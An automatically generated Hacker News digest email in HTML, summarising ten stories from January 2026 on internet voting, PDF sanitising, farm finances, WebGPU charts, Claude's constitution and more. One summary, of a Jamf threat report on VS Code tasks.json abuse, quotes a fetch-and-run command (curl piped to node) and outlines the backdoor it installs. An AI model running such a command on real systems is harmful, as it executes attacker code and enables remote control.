@@ -1,0 +1,506 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>HackerNews Digest</title>
+  <style>
+    /* HackerNews-inspired minimal digest email styles */
+body {
+  margin: 0;
+  padding: 0;
+  background-color: #f6f6ef; /* Classic HN background */
+  font-family: Verdana, Geneva, sans-serif; /* HN uses Verdana */
+  -webkit-font-smoothing: antialiased;
+  color: #000000;
+  line-height: 1.5;
+  font-size: 14px;
+}
+
+.container {
+  max-width: 700px;
+  margin: 0 auto;
+  background-color: #f6f6ef;
+  padding: 10px;
+}
+
+.header {
+  background-color: #ff6600; /* Classic HN orange */
+  padding: 6px;
+  margin-bottom: 20px;
+}
+
+.header h1 {
+  margin: 0;
+  color: #000000;
+  font-size: 13px;
+  font-weight: bold;
+  padding: 4px 8px;
+}
+
+.header .date {
+  margin: 0;
+  padding: 4px 8px;
+  color: #000000;
+  font-size: 11px;
+  opacity: 0.8;
+}
+
+.content-body {
+  background-color: #ffffff;
+  border: 1px solid #dddddd;
+  padding: 20px;
+}
+
+.article {
+  margin-bottom: 32px;
+  padding-bottom: 24px;
+  border-bottom: 1px solid #e5e5e5;
+}
+
+.article:last-child {
+  border-bottom: none;
+  margin-bottom: 0;
+  padding-bottom: 0;
+}
+
+.article-title {
+  margin: 0 0 4px 0;
+  font-size: 15px;
+  line-height: 1.3;
+  font-weight: normal;
+}
+
+.article-title a {
+  color: #000000;
+  text-decoration: none;
+}
+
+.article-title a:hover {
+  text-decoration: underline;
+}
+
+.article-meta {
+  font-size: 11px;
+  color: #828282; /* HN gray for metadata */
+  margin-bottom: 12px;
+  display: block;
+}
+
+.section {
+  margin-top: 12px;
+}
+
+.section-label {
+  font-size: 11px;
+  font-weight: bold;
+  text-transform: uppercase;
+  color: #828282;
+  letter-spacing: 0.5px;
+  margin-bottom: 6px;
+  border-bottom: 1px solid #f0f0f0;
+  padding-bottom: 3px;
+}
+
+.summary-content {
+  font-size: 13px;
+  color: #000000;
+  margin-bottom: 16px;
+  line-height: 1.5;
+  white-space: pre-line;
+}
+
+.comments-box {
+  background-color: #f9f9f9;
+  border-left: 3px solid #ff6600;
+  padding: 10px 12px;
+  margin-top: 8px;
+}
+
+.comments-content {
+  font-size: 12px;
+  color: #333333;
+  line-height: 1.6;
+  white-space: pre-line;
+}
+
+.read-link {
+  display: inline-block;
+  margin-top: 8px;
+  font-size: 11px;
+  color: #ff6600;
+  text-decoration: none;
+  font-weight: bold;
+}
+
+.read-link:hover {
+  text-decoration: underline;
+}
+
+.footer {
+  background-color: #f6f6ef;
+  padding: 16px 0;
+  text-align: center;
+  font-size: 11px;
+  color: #828282;
+  margin-top: 20px;
+}
+
+.footer p {
+  margin: 4px 0;
+}
+
+.footer a {
+  color: #000000;
+  text-decoration: underline;
+}
+
+.footer a:hover {
+  color: #ff6600;
+}
+
+/* Mobile responsive */
+@media only screen and (max-width: 600px) {
+  .container {
+    width: 100% !important;
+    padding: 5px;
+  }
+  
+  .content-body {
+    padding: 12px;
+  }
+  
+  .header {
+    padding: 4px;
+  }
+  
+  .header h1 {
+    font-size: 12px;
+    padding: 3px 6px;
+  }
+  
+  .article-title {
+    font-size: 14px;
+  }
+  
+  .summary-content {
+    font-size: 12px;
+  }
+  
+  .comments-content {
+    font-size: 11px;
+  }
+}
+
+/* Better rendering across email clients */
+table {
+  border-collapse: collapse;
+}
+
+a img {
+  border: none;
+}
+
+/* Ensure consistent box model */
+* {
+  box-sizing: border-box;
+}
+
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>HackerNews Digest</h1>
+      <p class="date">January 22, 2026</p>
+    </div>
+
+    <div class="content-body">
+      
+      <div class="article">
+        <h2 class="article-title">
+          <a href="https://blog.citp.princeton.edu/2026/01/16/internet-voting-is-insecure-and-should-not-be-used-in-public-elections/" target="_blank">Internet voting is insecure and should not be used in public elections</a>
+        </h2>
+        <span class="article-meta">
+          177 points • by WaitWaitWha • 27 comments
+        </span>
+
+        <div class="section">
+          <div class="section-label">Summary</div>
+          <div class="summary-content">
+            Internet voting remains insecure and cannot be made safe with existing technology. All such systems suffer three core vulnerabilities: (1) voter‑device malware can alter selections; (2) server‑side malware or insider attacks can modify ballots; (3) county‑office systems that process internet ballots are equally vulnerable to hacking. Unlike paper ballots, a single global attacker can affect large numbers of votes undetected. End‑to‑end verifiable internet voting (E2E‑VIV) adds further weaknesses: verification apps may be compromised, receipt‑free designs are complex and rarely used, and there is no reliable dispute‑resolution mechanism for voters who detect fraud. The recently announced “VoteSecure” SDK, promoted by Bradley Tusk’s Mobile Voting Foundation, exhibits the same security gaps; developers acknowledge the flaws and lack a viable remedy. The scientific consensus, reflected in decades of peer‑reviewed research, holds that no known or foreseeable technology can secure internet voting for public elections. Consequently, election officials should treat press releases about internet voting with caution and rely on established, peer‑reviewed security analyses.
+          </div>
+          <a href="https://blog.citp.princeton.edu/2026/01/16/internet-voting-is-insecure-and-should-not-be-used-in-public-elections/" target="_blank" class="read-link">Read full article →</a>
+        </div>
+
+        <div class="section">
+          <div class="section-label">Community Discussion</div>
+          <div class="comments-box">
+            <div class="comments-content">
+              The comments collectively emphasize trust as the decisive factor in elections, viewing paper‑based voting as the more reliable and auditable method because its vulnerabilities and safeguards are well understood. Concerns dominate regarding the security, secrecy, and scalability of internet voting, with many highlighting the ease of large‑scale manipulation and the difficulty of guaranteeing a trustworthy system. A smaller subset argues that strong cryptographic techniques, blockchain or rigorous oversight could make online voting feasible, but most remain skeptical that such safeguards can be universally achieved. Overall sentiment favors maintaining or reverting to paper or hybrid voting processes.
+            </div>
+          </div>
+          <a href="https://news.ycombinator.com/item?id=46713924" target="_blank" class="read-link">Read all comments →</a>
+        </div>
+      </div>
+      
+      <div class="article">
+        <h2 class="article-title">
+          <a href="https://github.com/freedomofpress/dangerzone" target="_blank">Take potentially dangerous PDFs, and convert them to safe PDFs</a>
+        </h2>
+        <span class="article-meta">
+          87 points • by dp-hackernews • 12 comments
+        </span>
+
+        <div class="section">
+          <div class="section-label">Summary</div>
+          <div class="summary-content">
+            GitHub repository freedomofpress/dangerzone is a tool designed to mitigate security risks in file handling by converting potentially malicious PDFs, Office documents, and image files into safe, sanitized PDFs. The project’s interface includes settings and conversion functions, as indicated by associated UI screenshots. The repository lists contributions from multiple users (e.g., @apyrgio, @micahflee, @deeplow, @almet, @jkarasti, @dependabot[bot], @gmarmstrong, @naglis, @OctopusET, @garrettr, @EtiennePerot, @keywordnew, @rocodes, @sudwhiwdh). Access to the repository’s main content is currently restricted, shown by the message “You can’t perform that action at this time.” No additional documentation or code details are present in the provided text.
+          </div>
+          <a href="https://github.com/freedomofpress/dangerzone" target="_blank" class="read-link">Read full article →</a>
+        </div>
+
+        <div class="section">
+          <div class="section-label">Community Discussion</div>
+          <div class="comments-box">
+            <div class="comments-content">
+              The comments express caution about leaking documents, emphasizing the need for strong warnings and acknowledging that personal exposure to source files makes safety verification difficult. Watermarking and text paraphrasing are noted as partial mitigations, while sandboxed Docker execution and limited‑function PDF viewers are suggested as safer alternatives. Users criticize the current interface for lacking command‑line integration, appreciate the compression benefits of OCR‑based processing, and highlight the high cost of commercial CDR tools, promoting a free, multi‑format preview service and questioning its relevance for image files.
+            </div>
+          </div>
+          <a href="https://news.ycombinator.com/item?id=46712815" target="_blank" class="read-link">Read all comments →</a>
+        </div>
+      </div>
+      
+      <div class="article">
+        <h2 class="article-title">
+          <a href="https://www.fb.org/market-intel/significant-farm-losses-persist-despite-federal-assistance" target="_blank">Significant US Farm Losses Persist, Despite Federal Assistance</a>
+        </h2>
+        <span class="article-meta">
+          80 points • by toomuchtodo • 14 comments
+        </span>
+
+        <div class="section">
+          <div class="section-label">Summary</div>
+          <div class="summary-content">
+            The USDA Economic Research Service’s December update projects per‑acre production costs for all nine principal row crops to rise again in 2026, extending a cost‑increase trend that began after 2021. 2025 total costs range from $396/acre for wheat to $1,336/acre for rice; 2026 increases of 2.2‑3.3% are expected, keeping wheat, sorghum and oats at the low end and cotton, peanuts and rice at the high end.  Operating expenses—seed, fertilizer, chemicals, fuel, labor, interest, maintenance—remain well above pre‑2021 levels, with notable hikes in interest (+71%), fertilizer (+37%), fuel (+32%), labor (+47%) and chemicals (+25%).  Commodity prices are insufficient to cover these costs, so farms are projected to post losses for a fourth‑fifth consecutive year even after crop‑insurance indemnities and federal assistance (Farmer Bridge Assistance and Emergency Commodity Assistance Program).  Net sector losses exceed $50 billion over the past three crop years; per‑acre losses range from $42 (barley) to $210 (rice).  Specialty‑crop programs provide limited relief, leaving many growers with persistent negative margins and strained cash flow.  Proposed safety‑net enhancements (OBBBA) will not take effect until late 2026, so short‑term financial pressures remain.
+          </div>
+          <a href="https://www.fb.org/market-intel/significant-farm-losses-persist-despite-federal-assistance" target="_blank" class="read-link">Read full article →</a>
+        </div>
+
+        <div class="section">
+          <div class="section-label">Community Discussion</div>
+          <div class="comments-box">
+            <div class="comments-content">
+              The discussion conveys strong criticism of the current agricultural system, emphasizing that large corporations dominate seed, equipment, processing and market pricing, leaving farmers with limited bargaining power and often pushing them toward bankruptcy or land loss. Subsidies are viewed as largely transferring wealth to these corporations rather than stabilizing farms, while strategic concerns about food security and national self‑sufficiency are highlighted. Alternative models such as Canadian supply‑management and Chinese government‑directed support are presented as possible ways to achieve stable prices and protect smaller producers.
+            </div>
+          </div>
+          <a href="https://news.ycombinator.com/item?id=46713929" target="_blank" class="read-link">Read all comments →</a>
+        </div>
+      </div>
+      
+      <div class="article">
+        <h2 class="article-title">
+          <a href="https://arxiv.org/abs/2201.01174" target="_blank">Binary Fuse Filters: Fast and Smaller Than XOR Filters</a>
+        </h2>
+        <span class="article-meta">
+          37 points • by redbell • 0 comments
+        </span>
+
+        <div class="section">
+          <div class="section-label">Summary</div>
+          <div class="summary-content">
+            Binary Fuse Filters are presented as a new class of probabilistic set‑membership data structures that achieve both faster query times and reduced memory usage compared to existing xor filters. The work focuses on designing the filter’s internal representation and construction algorithms to improve performance while maintaining comparable false‑positive rates. Empirical results demonstrate that binary fuse filters consistently outperform xor filters in speed and occupy less space, making them advantageous for high‑throughput applications requiring compact approximate membership testing.
+          </div>
+          <a href="https://arxiv.org/abs/2201.01174" target="_blank" class="read-link">Read full article →</a>
+        </div>
+
+        <div class="section">
+          <div class="section-label">Community Discussion</div>
+          <div class="comments-box">
+            <div class="comments-content">
+              None
+            </div>
+          </div>
+          <a href="https://news.ycombinator.com/item?id=46658128" target="_blank" class="read-link">Read all comments →</a>
+        </div>
+      </div>
+      
+      <div class="article">
+        <h2 class="article-title">
+          <a href="https://github.com/ChartGPU/ChartGPU" target="_blank">Show HN: ChartGPU – WebGPU-powered charting library (1M points at 60fps)</a>
+        </h2>
+        <span class="article-meta">
+          515 points • by huntergemmer • 60 comments
+        </span>
+
+        <div class="section">
+          <div class="section-label">Summary</div>
+          <div class="summary-content">
+            ChartGPU is an open‑source charting library built on WebGPU, enabling high‑performance, GPU‑accelerated visualizations for web applications. The project is hosted on GitHub and distributed via npm, providing developers with a ready‑to‑install package. It includes a live demo showcasing various chart types, such as candlestick charts, demonstrating the library’s rendering capabilities. The repository lists its licensing information, allowing unrestricted use under the specified terms. Overall, ChartGPU offers a modern, GPU‑based solution for creating interactive, aesthetically pleasing charts directly in the browser.
+          </div>
+          <a href="https://github.com/ChartGPU/ChartGPU" target="_blank" class="read-link">Read full article →</a>
+        </div>
+
+        <div class="section">
+          <div class="section-label">Community Discussion</div>
+          <div class="comments-box">
+            <div class="comments-content">
+              Enthusiasm dominates the discussion, with many noting the remarkable smoothness, high frame rates and scalability of the WebGPU charts, especially for large datasets and live‑streaming scenarios. Practical feedback highlights bugs such as slider drift, panning thresholds, and missing fallback for browsers lacking WebGPU, alongside requests for columnar data layouts, worker‑thread/offscreen support, and integration with existing ecosystems like Vega, React Native or Jupyter. Skeptical voices question the necessity for extreme point counts, cite compatibility gaps on Safari, Firefox and some Linux setups, and raise security concerns about GPU access. Overall the project is praised for its performance while prompting several usability and portability improvements.
+            </div>
+          </div>
+          <a href="https://news.ycombinator.com/item?id=46706528" target="_blank" class="read-link">Read all comments →</a>
+        </div>
+      </div>
+      
+      <div class="article">
+        <h2 class="article-title">
+          <a href="https://www.anthropic.com/news/claude-new-constitution" target="_blank">Claude&#39;s new constitution</a>
+        </h2>
+        <span class="article-meta">
+          325 points • by meetpateltech • 59 comments
+        </span>
+
+        <div class="section">
+          <div class="section-label">Summary</div>
+          <div class="summary-content">
+            Claude’s new constitution is a publicly released, CC0‑licensed document that outlines Anthropic’s intended values and behavior for the Claude model. It serves as the primary authority guiding training, synthetic data generation, and future model updates, and it is meant to be read by Claude itself to inform its actions. The constitution prioritizes four core properties—broad safety (preserving human oversight), broad ethics (honesty, avoidance of harm), compliance with Anthropic’s specific guidelines, and genuine helpfulness—listed in order of precedence for conflict resolution. Its structure includes sections on helpfulness, Anthropic’s supplemental guidelines, Claude’s ethics (including hard constraints such as prohibitions on bioweapon assistance), safety over ethics to maintain controllability, and reflections on Claude’s nature, identity, and psychological security. The document emphasizes explanatory, principle‑based guidance over rigid rules, aiming to enable generalization to novel situations while retaining “hard constraints” for high‑risk actions. Anthropic commits to ongoing transparency, external expert feedback, and continuous refinement as model capabilities evolve.
+          </div>
+          <a href="https://www.anthropic.com/news/claude-new-constitution" target="_blank" class="read-link">Read full article →</a>
+        </div>
+
+        <div class="section">
+          <div class="section-label">Community Discussion</div>
+          <div class="comments-box">
+            <div class="comments-content">
+              The comments largely view Anthropic’s constitution as vague, relativistic and largely symbolic, suspecting it serves more as legal cover, marketing or PR than as a concrete safety mechanism. Critics note the anthropomorphizing language, the absence of fixed moral anchors, and the potential for loopholes that let models bypass constraints, questioning its practical impact and transparency. While some acknowledge the need for guidance in model training, the prevailing tone is distrustful, emphasizing that the document appears performative and insufficiently backed by evidence.
+            </div>
+          </div>
+          <a href="https://news.ycombinator.com/item?id=46707572" target="_blank" class="read-link">Read all comments →</a>
+        </div>
+      </div>
+      
+      <div class="article">
+        <h2 class="article-title">
+          <a href="https://www.jamf.com/blog/threat-actors-expand-abuse-of-visual-studio-code/" target="_blank">Threat Actors Expand Abuse of Microsoft Visual Studio Code</a>
+        </h2>
+        <span class="article-meta">
+          16 points • by vinnyglennon • 0 comments
+        </span>
+
+        <div class="section">
+          <div class="section-label">Summary</div>
+          <div class="summary-content">
+            The campaign, linked to a North‑Korean threat actor, leverages Microsoft Visual Studio Code tasks.json files to execute malicious code when a victim opens a cloned GitHub or GitLab repository in VS Code. Granting repository trust triggers a background command on macOS that runs `nohup bash -c "curl -s <URL> | node"` to fetch an obfuscated JavaScript payload hosted on vercel.app. The payload (SHA‑256 932a678…) contains largely dead code but implements a persistent backdoor that:
+
+- Beacons every 5 seconds to a C2 server, sending hostname, MAC addresses, OS details and public IP (via ipify.org).  
+- Executes arbitrary JavaScript supplied by the C2, allowing dynamic import of Node.js modules and full remote code execution.  
+- Can spawn child processes, terminate itself, and clean up on attacker command.
+
+Subsequent payloads reuse the same C2 infrastructure and show AI‑generated code comments. The abuse demonstrates adaptation of developer tools for macOS malware delivery. Mitigations include enabling Jamf Threat Prevention/Advanced Threat Controls in block mode and vetting third‑party repositories and npm install scripts before trusting them.
+          </div>
+          <a href="https://www.jamf.com/blog/threat-actors-expand-abuse-of-visual-studio-code/" target="_blank" class="read-link">Read full article →</a>
+        </div>
+
+        <div class="section">
+          <div class="section-label">Community Discussion</div>
+          <div class="comments-box">
+            <div class="comments-content">
+              None
+            </div>
+          </div>
+          <a href="https://news.ycombinator.com/item?id=46713526" target="_blank" class="read-link">Read all comments →</a>
+        </div>
+      </div>
+      
+      <div class="article">
+        <h2 class="article-title">
+          <a href="https://skip.dev/blog/skip-is-free/" target="_blank">Skip is now free and open source</a>
+        </h2>
+        <span class="article-meta">
+          292 points • by dayanruben • 21 comments
+        </span>
+
+        <div class="section">
+          <div class="section-label">Summary</div>
+          <div class="summary-content">
+            Skip is a cross‑platform development framework that lets developers build native iOS and Android apps from a single Swift / SwiftUI codebase. Since its 2023 launch, Skip progressed from a Swift‑to‑Kotlin transpiler to a native Swift Android SDK and a comprehensive SwiftUI implementation supporting many integration frameworks and Swift packages. Up to version 1.7 the tool required a paid subscription and license keys for business use; free usage was limited to indie developers below a revenue threshold. As of Skip 1.7, all licensing is removed: no keys, EULAs, or trial periods. The core engine, “skipstone,” is now open‑source on GitHub under a free license, handling project creation, Xcode/SwiftPM plugins, iOS‑to‑Android transformation, resource bundling, JNI bridge generation, transpilation, packaging, and export. Documentation and the site have moved to skip.dev, also open‑source. Existing paid plans convert to Individual or Supporter tiers, and the project seeks community funding via GitHub Sponsors and corporate sponsorships to sustain development. Skip remains bootstrapped, independent of venture funding, and positions itself as a no‑compromise alternative to legacy cross‑platform tools.
+          </div>
+          <a href="https://skip.dev/blog/skip-is-free/" target="_blank" class="read-link">Read full article →</a>
+        </div>
+
+        <div class="section">
+          <div class="section-label">Community Discussion</div>
+          <div class="comments-box">
+            <div class="comments-content">
+              Comments show mixed reactions to the new open‑source cross‑platform tool. Users express curiosity and willingness to try it, especially for consolidating iOS and Android code, but request clearer licensing, real‑world case studies, and evidence of performance and accessibility support. Concerns arise about the high memory recommendation, limited documentation on complex UI features, and uncertainty about maturity compared with Flutter, React Native, Compose, or MAUI. Overall sentiment leans toward cautious optimism tempered by practical doubts about tooling readiness and adoption evidence.
+            </div>
+          </div>
+          <a href="https://news.ycombinator.com/item?id=46706906" target="_blank" class="read-link">Read all comments →</a>
+        </div>
+      </div>
+      
+      <div class="article">
+        <h2 class="article-title">
+          <a href="https://aljamal.substack.com/p/golfing-aplk-in-90-lines-of-python" target="_blank">Golfing APL/K in 90 Lines of Python</a>
+        </h2>
+        <span class="article-meta">
+          56 points • by aburjg • 3 comments
+        </span>
+
+        <div class="section">
+          <div class="section-label">Summary</div>
+          <div class="summary-content">
+            None
+          </div>
+          <a href="https://aljamal.substack.com/p/golfing-aplk-in-90-lines-of-python" target="_blank" class="read-link">Read full article →</a>
+        </div>
+
+        <div class="section">
+          <div class="section-label">Community Discussion</div>
+          <div class="comments-box">
+            <div class="comments-content">
+              The comment notes that early Lisp lacked many data structures, which were later added, and draws a parallel to Whitney’s ksimple implementation. It expresses strong displeasure with K’s reliance on non‑standard keyboard symbols, describing them as attention‑seeking and frustrating, while simultaneously praising K programs for their extreme terseness and aesthetic appeal, likening that beauty to APL. Overall, the tone blends criticism of the language’s syntax choices with admiration for its expressive power.
+            </div>
+          </div>
+          <a href="https://news.ycombinator.com/item?id=46651027" target="_blank" class="read-link">Read all comments →</a>
+        </div>
+      </div>
+      
+      <div class="article">
+        <h2 class="article-title">
+          <a href="https://terabytedeals.com" target="_blank">Show HN: TerabyteDeals – Compare storage prices by $/TB</a>
+        </h2>
+        <span class="article-meta">
+          76 points • by vektor888 • 12 comments
+        </span>
+
+        <div class="section">
+          <div class="section-label">Summary</div>
+          <div class="summary-content">
+            None
+          </div>
+          <a href="https://terabytedeals.com" target="_blank" class="read-link">Read full article →</a>
+        </div>
+
+        <div class="section">
+          <div class="section-label">Community Discussion</div>
+          <div class="comments-box">
+            <div class="comments-content">
+              Comments focus on frequent price inaccuracies across regions, with users noting discrepancies between the site’s listings and actual Amazon prices for HDDs and SSDs, especially in the US, France, Germany, and India. Many request broader market support, inclusion of local retailers like Flipkart, and additional filters such as NAS‑rated drives, RPM, and price‑per‑TB graphs. While some appreciate the multi‑source dropdown interface, overall sentiment is frustration over unreliable data and a desire for more comprehensive, verifiable pricing and feature enhancements.
+            </div>
+          </div>
+          <a href="https://news.ycombinator.com/item?id=46711649" target="_blank" class="read-link">Read all comments →</a>
+        </div>
+      </div>
+      
+    </div>
+
+    <div class="footer">
+      <p>This digest was generated automatically.</p>
+      
+    </div>
+  </div>
+</body>
+
+</html>
